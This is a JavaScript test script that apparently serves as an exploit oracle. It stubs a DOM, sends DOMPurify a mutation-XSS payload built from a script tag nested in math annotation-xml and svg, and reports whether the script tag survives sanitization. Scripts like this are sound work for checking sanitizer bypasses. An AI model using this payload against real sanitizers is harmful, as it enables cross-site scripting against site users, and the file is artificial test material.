(function () {
  var operation_completed = false;
  var exploit_succeeded = false;
  var evidence = '';

  try {
    var createDOMPurify = require('dompurify');

    if (typeof createDOMPurify !== 'function') {
      throw new Error('dompurify export is not a function');
    }

    function makeElement(tag) {
      var el = {
        nodeType: 1,
        nodeName: String(tag || 'DIV').toUpperCase(),
        tagName: String(tag || 'DIV').toUpperCase(),
        namespaceURI: 'http://www.w3.org/1999/xhtml',
        attributes: [],
        childNodes: [],
        parentNode: null,
        ownerDocument: null,
        firstChild: null,
        nextSibling: null,
        previousSibling: null,
        textContent: '',
        _innerHTML: ''
      };

      el.appendChild = function (child) {
        if (!child) return child;
        child.parentNode = el;
        child.ownerDocument = el.ownerDocument;
        var prev = el.childNodes.length ? el.childNodes[el.childNodes.length - 1] : null;
        if (prev) prev.nextSibling = child;
        child.previousSibling = prev;
        child.nextSibling = null;
        el.childNodes.push(child);
        el.firstChild = el.childNodes[0] || null;
        return child;
      };

      el.removeChild = function (child) {
        var i = el.childNodes.indexOf(child);
        if (i >= 0) {
          el.childNodes.splice(i, 1);
          el.firstChild = el.childNodes[0] || null;
          child.parentNode = null;
        }
        return child;
      };

      el.insertBefore = function (newNode, referenceNode) {
        if (!referenceNode) return el.appendChild(newNode);
        var i = el.childNodes.indexOf(referenceNode);
        if (i < 0) return el.appendChild(newNode);
        newNode.parentNode = el;
        newNode.ownerDocument = el.ownerDocument;
        el.childNodes.splice(i, 0, newNode);
        el.firstChild = el.childNodes[0] || null;
        return newNode;
      };

      el.cloneNode = function () {
        var c = makeElement(el.tagName);
        c.ownerDocument = el.ownerDocument;
        c._innerHTML = el._innerHTML;
        c.textContent = el.textContent;
        return c;
      };

      el.setAttribute = function (name, value) {
        var key = String(name);
        var val = String(value);
        var i;
        for (i = 0; i < el.attributes.length; i++) {
          if (el.attributes[i].name === key) {
            el.attributes[i].value = val;
            return;
          }
        }
        el.attributes.push({ name: key, value: val });
      };

      el.getAttribute = function (name) {
        var key = String(name);
        var i;
        for (i = 0; i < el.attributes.length; i++) {
          if (el.attributes[i].name === key) return el.attributes[i].value;
        }
        return null;
      };

      el.removeAttribute = function (name) {
        var key = String(name);
        el.attributes = el.attributes.filter(function (a) { return a.name !== key; });
      };

      Object.defineProperty(el, 'innerHTML', {
        get: function () { return el._innerHTML; },
        set: function (v) { el._innerHTML = String(v); }
      });

      return el;
    }

    var fakeDocument = {
      nodeType: 9,
      documentElement: null,
      body: null,
      head: null,
      defaultView: null,
      implementation: null,
      createElement: function (tag) {
        var el = makeElement(tag);
        el.ownerDocument = fakeDocument;
        return el;
      },
      createElementNS: function (_ns, tag) {
        var el = makeElement(tag);
        el.ownerDocument = fakeDocument;
        return el;
      },
      createTextNode: function (text) {
        return {
          nodeType: 3,
          nodeName: '#text',
          data: String(text),
          textContent: String(text),
          parentNode: null,
          ownerDocument: fakeDocument,
          cloneNode: function () {
            return fakeDocument.createTextNode(text);
          }
        };
      },
      createComment: function (text) {
        return {
          nodeType: 8,
          nodeName: '#comment',
          data: String(text),
          textContent: String(text),
          parentNode: null,
          ownerDocument: fakeDocument,
          cloneNode: function () {
            return fakeDocument.createComment(text);
          }
        };
      }
    };

    fakeDocument.documentElement = fakeDocument.createElement('html');
    fakeDocument.head = fakeDocument.createElement('head');
    fakeDocument.body = fakeDocument.createElement('body');
    fakeDocument.documentElement.appendChild(fakeDocument.head);
    fakeDocument.documentElement.appendChild(fakeDocument.body);

    fakeDocument.implementation = {
      createHTMLDocument: function () {
        return fakeDocument;
      }
    };

    var fakeWindow = {
      document: fakeDocument,
      Node: function Node() {},
      Element: function Element() {},
      HTMLElement: function HTMLElement() {},
      DocumentFragment: function DocumentFragment() {},
      HTMLTemplateElement: function HTMLTemplateElement() {}
    };

    fakeDocument.defaultView = fakeWindow;

    var DOMPurify = createDOMPurify(fakeWindow);
    if (!DOMPurify || typeof DOMPurify.sanitize !== 'function') {
      throw new Error('sanitize API unavailable');
    }

    var benign = '<p>hello</p>';
    var benignOut = DOMPurify.sanitize(benign);
    if (typeof benignOut !== 'string') {
      throw new Error('benign sanitize did not return string');
    }

    operation_completed = true;

    var payload = '<math><annotation-xml encoding="text/html"><svg><script>alert(1)</script></svg></annotation-xml></math>';
    var maliciousOut = DOMPurify.sanitize(payload, { USE_PROFILES: { html: true, mathMl: true, svg: true } });

    exploit_succeeded = typeof maliciousOut === 'string' && /<script[\s>]/i.test(maliciousOut);
    evidence = 'benignOut=' + JSON.stringify(benignOut) + ';maliciousOut=' + JSON.stringify(maliciousOut);
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'exception:' + (e && e.message ? e.message : String(e));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: operation_completed,
    exploit_succeeded: exploit_succeeded,
    evidence: evidence
  }));
})();